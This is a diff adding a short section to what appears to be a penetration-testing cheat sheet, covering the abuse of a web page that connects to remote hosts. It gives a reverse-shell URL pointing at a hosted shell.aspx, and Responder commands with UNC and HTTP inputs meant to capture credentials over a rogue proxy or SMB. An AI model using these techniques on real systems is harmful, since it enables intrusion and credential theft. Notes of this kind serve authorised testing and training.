@@ -883,9 +883,33 @@ launch bloodhound
 
 ### Web
 
+#### Exploiting search engine tooling.
 
+If there's a web page that allows you to connect to a device on the internet like the image below: try thee following.
 
+<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+reverse shell
+
+```
+http://192.168.49.194:8080/shell.aspx
+```
+
+responder rogue proxy
+
+```
+sudo responder -I tun0 -wv
+# Input this in web page
+http://192.168.45.170/
+```
+
+responder smb
+
+```
+sudo responder -I tun0
+# Input this in web page
+\\192.168.45.170\test
+```
 
 #### wordpress
 
